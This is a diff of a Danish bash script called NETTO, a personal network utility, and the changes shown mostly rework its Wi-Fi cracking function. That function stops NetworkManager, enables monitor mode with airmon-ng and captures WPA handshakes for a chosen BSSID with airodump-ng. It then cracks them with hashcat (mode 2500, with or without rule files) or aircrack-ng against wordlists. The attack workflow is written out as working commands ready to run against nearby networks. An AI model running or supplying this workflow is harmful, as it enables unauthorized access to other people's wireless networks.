@@ -1,37 +1,25 @@
 #!/usr/bin/env bash
 
-###
-### TODO: SKRIPTET MANGLER MULIGHED FOR AT GEMME OPSÆTNING I KONFIGURATIONSFIL OG MERE SIKKER SLETNING AF CRACK-FILER, FOR AT GÅ I BETA
-### 
-
-# ROD
-# Hvad gør det her egentligt godt for?
-
-ssidArray=()
-ssid=''
-wpa=''
-autocon=''
-conname=''
-mon=''
-iwconfig=''
-ok=''
-opt=''
-dictpath=''
-bssidtocrack=''
-bssid=''
-hndtryk=''
-crackbssid=''
-dev=''
-dict=''
-dictpath=''
-mondev=''
-rule=''
-valg=''
+##############################################################
+###                                                        ###
+### NETTO: PERSONLIGT NETVÆRKSSKRIPT                       ###
+###                                                        ###
+### ÆNDRINGER.                                             ###
+###   * Version 0.57a                                      ###
+###     1.Opryd. og optim. af sproget i "niettrekvarte".   ###
+###                                                        ###
+### TODO.                                                  ###
+###     1. Oprydning og optimering af sproget              ###
+###     2.SKRIPTET MANGLER MULIGHED FOR AT GEMME OPSÆTNING ###
+###       I KONFIGURATIONSFIL OG MERE SIKKER SLETNING AF   ###
+###       CRACK-FILER, FOR AT GÅ I BETA                    ###
+###                                                        ###
+##############################################################
 
 # VERSION
 #
 
-os="# NETTO - version 0.56a"
+os="# NETTO - version 0.57a"
 
 # FARVER
 #
@@ -47,9 +35,6 @@ farve_std="\e[39m" #STANDARD
 # MIDLERTIDIGE FILER
 #
 
-phy_line=$(mktemp)
-wifi_dev=$(mktemp)
-mondevice=$(mktemp)
 ovpnindh=$(mktemp)
 vpnmenuselect=$(mktemp)
 
@@ -58,77 +43,95 @@ vpnmenuselect=$(mktemp)
 	############################################################
 
 
-	#################### STARTER MONITORERING ###################
-	###########  A N O R M A L E  F U N K T I O N E R ###########	
+	#################### STARTER MONITORERING ##################
+	###########  A N O R M A L E  F U N K T I O N E R ##########	
+
 niettrekvarte(){
+ 
   echo -e $farve_std
 	clear
 
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
   echo "CRACKING AF NETVÆRK KRÆVER IKKE KUN PERSONLIGE TILLADELSER."
-	
-  mon="sudo -s airmon-ng"
-	$mon  > ${phy_line}
-	while read line; do
-		for searchdev in $line; do
-			if [[ $searchdev = *"wlp"* ]] || [[ $searchdev = *"wlan"* ]];then
-				echo "DIT UDSTYR ER:" $searchdev
-				dev=$searchdev
-				break
-			fi
-		done
-	done<${phy_line}
-	
-  rm $phy_line
-	rm $wifi_dev
-	
+
+# DETTE KAN MULIGVIS OPTIMERES MED AWK.	
+
+  output_fil=$(mktemp)
+  echo "> Finder wlan-enhed"
+  soeg_enhed="sudo -s airmon-ng"
+	  $soeg_enhed  > ${output_fil}
+	  while read line; do
+		  for enhed in $line; do
+        wlan_enhed=$(sudo -s airmon-ng | awk '/wlp/ {print $2}')
+				  break
+		  done
+	  done<${output_fil}
+  rm $output_fil
+  clear
+
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
   echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
 	echo "#####      S T O P P E R  N E T W O R K M A N A G E R  I  S Y S T E M C T L     #####"
 	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
 	echo ""
-	sudo systemctl stop NetworkManager
+	sudo systemctl stop NetworkManager &>/dev/null
 	clear
 	
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
   echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
 	echo "##### A I R C R A C K - N G  T J E K K E R  O G  D R Æ B E R  P R O C E S S E R #####"
 	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
 	echo ""
-	sudo airmon-ng check kill
+	sudo airmon-ng check kill &>/dev/null
 	clear
 	
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
   echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
 	echo "#####     A I R C R A C K - N G  S T A R T E R  M O N I T O R E R I N G      #####"
 	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
 	echo ""
-	sudo airmon-ng start "$dev"
+	sudo airmon-ng start "$wlan_enhed" &>/dev/null
 	clear
 	
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
   echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
 	echo "#####      F I N D E R  U D S T Y R E T  T I L  M O N I T O R E R I N G      #####"
 	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
 	echo ""
 	
-  ifconfig="ifconfig"
-	
-  $ifconfig > ${mondevice}
+  output_fil=$(mktemp)
+  
+  ifconfig="ifconfig" ; $ifconfig > ${output_fil}
 	while read line; do
-		for searchmon in $line; do
-			if [[ $searchmon = ${dev+*"mon"*} ]]; then
-				echo "DIT MONITORERINGSUDSTYR ER:" ${searchmon//:}
-				mondev=${searchmon//:}
+		for enhed in $line; do
+      monitor_enhed=$(ifconfig | awk '/wlp4s0mon/ {print $1}' | sed 's/://')
 				break
-			fi
 		done
-	done<${mondevice}
-	
+	done<${output_fil}
+  rm $output_fil
+
   clear
   crackshake
+
 }	
 
-	##################### FIND PIBE OG GIV HÅNDTRYK ####################
+	##################### FIND HÅNDTRYK ####################
 
 crackshake(){
-	getbssid="sudo airodump-ng --band abg $mondev" # --band a for 5ghz intet band argument 2ghz
 
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
 	echo "(1/2) SKRIPTET STARTER NU AIRODUMP-NG. DER GENERERES EN LIST AF TILGÆNGELIGE NETVÆRK.   "
 	echo "      NÅR DET ØNSKEDE NETVÆRKS BSSID (MAC-ADRESSE) ER FUNDET, TRYKKES q-TASTEN TO GANGE."
 	echo "                                                                                        "
@@ -138,44 +141,36 @@ crackshake(){
 	echo "          noget, der usædvanligt utilstrækkeligt ved din indtastning.                   "
 	echo "                                                                                        "
 	echo "                                                                                        "
-	read -p "   ENTER/RETURN for at fortsætte... " </dev/tty
-	$getbssid
+	read -p ">  ENTER/RETURN for at fortsætte... " </dev/tty
+	
+  sudo airodump-ng --band abg "$monitor_enhed" # --band a for 5ghz intet band argument 2ghz
 
 	echo ""
 	read -p "(!) BSSID: " bssid </dev/tty
-	
-  if [ -z $bssid ]; then
-#		fejla="(!)Feltet BSSID kan ikke være tomt"
-#		crackshake
-    meth="quit"
-    paybill  
-    menu
-  fi
+
+  # Hvis ingen indtastning, så send "afslut" variabel til crackmetode
+  [[ -z $bssid ]] && metode="afslut" && start_internet && menu
 	
   read -p "(!) KANAL: " kanal </dev/tty
-	read -p "HÅNDTRYKKETS KALDENAVN (uden filtype og mellemrum): " hndtryk </dev/tty
+	read -p "HÅNDTRYKKETS KALDENAVN: " hndtryk </dev/tty
   
-  if [ -z $kanal ]; then
-		fejlb="(!) Feltet KANAL kan ikke være tomt"
-		crackshake
-	elif [ -z $hndtryk ]; then
-		fejlc="(!) Feltet HÆNDTRYKKETS KALDENAVN kan ikke være tomt"
-		crackshake
-	elif [[ "$hndtryk" = *"netto"* ]]; then
-		fejld="(!) AF PRAKTISKE GRUNDE BEDES DU VÆLGE ET ANDET NAVN."
-		crackshake
-	fi
+  [[ -z $kanal ]] && crackshake || [[ -z $hndtryk ]] && crackshake || [[ "$hndtryk" = *"netto"* ]] &&	crackshake
+
+  # Hvis alt er okay, så gå til crackmetode
   crackmeth
 
 }
 
-	####################        CRACK SLANGS         ##################
+	####################        VÆLG METODE         ##################
 
 crackmeth(){
 	
   echo -e $farve_std
 	clear
   
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
   echo "(2/2) AIRODUMP-NG OVERVÅGER NU FORBINDELSEN OG FORSØGE AT OPFANGE ET HÅNDTRYK.     "
   echo "      ET HÅNDTRYK KAN GENERERES NÅR ET APPARAT FORSØGER AT OPRETTE FORBINDELSE TIL "
 	echo "      NETVÆRKET. HVIS DU BLIVER TRÆT AF AT VENTE, KAN DU FORSØGE AT GENNEMTVINGE ET"
@@ -187,145 +182,145 @@ crackmeth(){
 	echo "      (!) HVILKEN METODE VIL DU BRUGE TIL AT CRACKE FORBINDELSEN NÅR HÅNDTRYKKET ER"
 	echo "          GENERERET?                                                               "
 	echo "                                                                                   "
-	echo "          <h1> HASHCAT CRACKING MED ORDBOG, MEN UDEN REGELSÆT (HURTIG)             "
+	echo "          [ho] HASHCAT CRACKING MED ORDBOG, MEN UDEN REGELSÆT (HURTIG)             "
 	echo "               Denne metode anbefales ved brug af god WPA-ordbog.                  "
 	echo "                                                                                   "
-	echo "          <h2> HASHCAT CRACKING MED ORDBOG MED REGELSÆT (MULIGVIS MEGET LANGSOM)   "
+	echo "          [hr] HASHCAT CRACKING MED ORDBOG MED REGELSÆT (MULIGVIS MEGET LANGSOM)   "
 	echo "               Denne metode anbefales ikke til brug af WPA cracking. Men hvis du   "
 	echo "               ved hvad du laver og har visse info om sikkerhedskoden kan denne    "
 	echo "               metode være nyttig. Opsætning af ordbog og regel er muligvis        " 
 	echo "               nødvendig.                                                          "
 	echo "                                                                                   "
-	echo "          <ac> AIRCRACK CRACKING MED ORDBOG; MEN UDEN REGELSÆT (LANGSOM)           "
+	echo "          [ac] AIRCRACK CRACKING MED ORDBOG; MEN UDEN REGELSÆT (LANGSOM)           "
 	echo "               Denne metode langsommere end h1, men kan være nyttig, hvis Hashcat  "
 	echo "               ikke er installeret (af en eller anden mystisk årsag).              "
 	echo ""
-	read -p "KOMMANDO (fx. xx) " ab </dev/tty
-	maccrack
+	read -p "> " valg </dev/tty
+	metode_proxy
 }
 
-maccrack(){
-  if [[ -z "$ab" ]]; then
-    meth="quit"
-    paybill 
-  else
-	  airdump="sudo airodump-ng -c $kanal --bssid $bssid -w $hndtryk wlp4s0mon --ignore-negative-one"
-	  $airdump
-  fi
+metode_proxy(){
+  
+  # Hvis metoden er "afslut, så start internettet igen - ellers generér håndtryk.
+  #
+  [[ -z "$valg" ]] && metode="afslut" && start_internet 
+  
+  sudo airodump-ng -c "$kanal" --bssid "$bssid" -w "$hndtryk" "$monitor_enhed" --ignore-negative-one 
 
-  if [ "$ab" == "h2" ]; then
-		meth="h2"
-		crackdict
-	elif [ "$ab" == "h1" ]; then
-		meth="h1"
-		crackdict
-	elif [ "$ab" == "ac" ]; then
-		meth="ac"
-		crackdict
-	else	
-		crackmeth
-	fi
+  [[ "$valg" == "hr" ]] && metode="hr" &&	crack_med_ordbog 
+  [[ "$valg" == "ho" ]] &&	metode="ho" && crack_med_ordbog 
+  [[ "$valg" == "ac" ]] &&	metode="ac" && crack_med_ordbog || crackmeth
+
 }
 
 	#################### VÆLG ORDBOG ######################
 
-crackdict(){	
+crack_med_ordbog(){	
   echo -e $farve_std
 	clear
 
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
+  # SØG MAPPEN DICTS I STEDET OG OPSTIL LISTE MED NR MULIGHEDER
 	echo "VÆLG EN AF DINE ORDBØGER:"
 	echo ""
 	ls -f ${HOME}/dicts
 	
   echo ""
-	read -p "(!) SKRIV ORDBOGENS FILNAVN (${HOME}/dicts/) " dictfile </dev/tty
+	read -p "> (!) SKRIV ORDBOGENS FILNAVN " ordbog </dev/tty
 	
-  dictpath="${HOME}/dicts/${dictfile}"
+  ordbogens_placering="${HOME}/dicts/${ordbog}"
 	
-  if [[ -f "$dictpath" ]]; then
-	  rm $mondevice
-		paybill
-  elif [[ -z "$dictfile" ]]; then
-    menu
-	else
-		crackdict
-	fi
+  [[ -f "$ordbogens_placering" ]] &&	start_internet || [[ -z "$ordbog" ]] && menu || crack_med_ordbog
+
 }
 
 	########## SLÅ INTERNET TIL IGEN ################
 
-paybill(){
+start_internet(){
+  
   echo $farve_std
 	clear
 
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
 	echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
 	echo "#####                 S T O P P E R  M O N I T O R E R I N G                 #####"
 	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
 	echo ""
-	echo "> MONITORERING STOPPES PÅ $mondev"
-	sudo airmon-ng stop "$mondev"
+	sudo airmon-ng stop "$monitor_enhed" &>/dev/null
 	clear
 
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
   echo ""
 	echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
 	echo "#####  N E T W O R K M A N A G E R  A K T I V E R E S  I  S Y S T E M C T L  #####"
 	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
 	echo 
-	sudo systemctl start NetworkManager
+	sudo systemctl start NetworkManager &>/dev/null
   clear
   
-  if [ "$meth" = "h1" ]; then
-		hcnorule
-	elif [ "$meth" = "h2" ]; then
-		hcrule
-	elif [ "$meth" = "ac" ]; then
-		aircrack
-  elif [ "meth" = "quit" ]; then
-    menu
-	fi
+  [[ "$metode" = "ho" ]] &&	hc_ordbog_crack || [[ "$metode" = "hr" ]] &&	hc_regel_crack
+  [[ "$metode" = "ac" ]] &&	ac_ordbog_crack || [[ "$metode" = "afslut" ]] && menu
+
 }
 
 	#################### CRACK MED HASHCAT ###################
 
-hcrule(){
+hc_regel_crack(){
+ 
   echo -e $farve_std
 	clear
 
-	echo "VÆLG EN AF DINE REGEL LISTER (*.rule):"
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
+  # SOM OVENFOR, OPSTIL LISTE I STEDET...
+	
+  echo "VÆLG EN AF DINE REGEL LISTER (*.rule):"
 	echo
   ls -f ${HOME}/rules
 	echo
 	
-  read -p "INDTAST REGELSÆTTETS FILNAVN (${HOME}/rules/) " rulefile </dev/tty
+  read -p "> INDTAST REGELSÆTTETS FILNAVN " regel </dev/tty
 	
-  rule="${HOME}/rules/${rulefile}" 
+  regel_filens_placering="${HOME}/rules/${regel}" 
 	
-  if [[ -f "$rule" ]]; then
-		rulecrack
-  elif [[ -z "$rulefile" ]]; then
-    menu
-	else
-		hcrule
-	fi
+  [[ -f "$regel_filens_placering" ]] && start_crack_med_regel || [[ -z "$regel" ]] && menu
+  hc_regel_crack
+
 }
 
-rulecrack(){
+start_crack_med_regel(){
+
   echo -e $farve_std
   clear
+  
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
+  # Rens og omdøb håndtrykket ...
 
   wpaclean="wpaclean ${hndtryk}.cap ${hndtryk}-01.cap"
   $wpaclean
   
-  crack="sudo aircrack-ng -j $hndtryk ${hndtryk}.cap"
-  $crack
+  # generér hccapx fil til hashcat cracking ...
+  hccapx="sudo aircrack-ng -j $hndtryk ${hndtryk}.cap"
+  $hccapx
   
-  hashcat="sudo hashcat -m 2500 -r $rule ${hndtryk}.hccapx $dictpath -D 1,2 --force"
-  $hashcat
-	echo
+  koer_hashcat="sudo hashcat -m 2500 -r $regel_filens_placering ${hndtryk}.hccapx $ordbogens_placering -D 1,2 --force"
+  $koer_hashcat
 
+  # Spørger om filerne ønskes slettet ...
+  echo
 	echo "(!) VÆR OPMÆRKSOM PÅ HVILKE FILER DU SLETTER"
 	echo
-
+  
+  # IKKE HELT SIKKER METODE TIL SLETNING ...
   rm ${hndtryk}*.*
 
   # Menu eller afslut?
@@ -351,20 +346,23 @@ rulecrack(){
 
 }
 
-hcnorule(){
+hc_ordbog_crack(){
   echo -e $farve_std
 	clear
 
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
   wpaclean="wpaclean ${hndtryk}.cap ${hndtryk}-01.cap"
   $wpaclean
   
-  crack="sudo aircrack-ng -j $hndtryk ${hndtryk}.cap"
-  $crack
+  hccapx="sudo aircrack-ng -j $hndtryk ${hndtryk}.cap"
+  $hccapx
   
-  hashcat="sudo hashcat -m 2500 -a 0 ${hndtryk}.hccapx $dictpath -D 1,2 --force"
-  $hashcat
-	echo
-
+  koer_hashcat="sudo hashcat -m 2500 -a 0 ${hndtryk}.hccapx $ordbogens_placering -D 1,2 --force"
+  $koer_hashcat
+	
+  echo
 	echo "(!) VÆR OPMÆRKSOM PÅ HVILKE FILER DU SLETTER"
 	echo
   
@@ -395,10 +393,13 @@ hcnorule(){
 
 	#################### CRACK MED AIRCRACK-NG #################
 
-aircrack(){
+ac_ordbog_crack(){
   echo -e $farve_std
 	clear
 
+	echo $os
+  echo "# NIETTREKVARTE: FORSØG AT ÅBNE LUKKET FORBINDELSE" 
+  echo
   crack="sudo aircrack-ng -w $dictpath -b $bssid ${hndtryk}-01.cap"
   $crack
 	echo
@@ -1088,25 +1089,15 @@ done
 
        ##### TAG IMOD ARGUMENT #####
 
-if [ "$1" == "v" ] || [ "$1" == "vpn" ]; then
-  openvpn
-elif [ "$1" == "a" ] || [ "$1" == "auto" ]; then
-  opstartsforb
-elif [ "$1" == "f" ] || [ "$1" == "forbind" ]; then
-  midlforb
-elif [ "$1" == "r" ] || [ "$1" == "radio" ]; then
-  wifi_radio
-elif [ "$1" == "s" ] || [ "$1" == "slet" ]; then
-  fjernforb
-elif [ "$1" == "g" ] || [ "$1" == "gemt" ]; then
-  viskonf
-elif [ "$1" == "o" ] || [ "$1" == "om" ]; then
-  om
-elif [ "$1" == "n" ] || [ "$1" == "niettrekvarte" ]; then
- niettrekvarte
-elif [ "$1" == "h" ] || [ "$1" == "hjælp" ]; then
-  hlp
-fi
+[[ "$1" == "v" ]] || [[ "$1" == "vpn" ]] && openvpn
+[[ "$1" == "a" ]] || [[ "$1" == "auto" ]] && opstartsforb
+[[ "$1" == "f" ]] || [[ "$1" == "forbind" ]] && midlforb
+[[ "$1" == "r" ]] || [[ "$1" == "radio" ]] && wifi_radio
+[[ "$1" == "s" ]] || [[ "$1" == "slet" ]] && fjernforb
+[[ "$1" == "g" ]] || [[ "$1" == "gemt" ]] && viskonf
+[[ "$1" == "o" ]] || [[ "$1" == "om" ]] && om
+[[ "$1" == "n" ]] || [[ "$1" == "niettrekvarte" ]] && niettrekvarte
+[[ "$1" == "h" ]] || [[ "$1" == "hjælp" ]] && hlp
 
 	################# MENU ###############
 
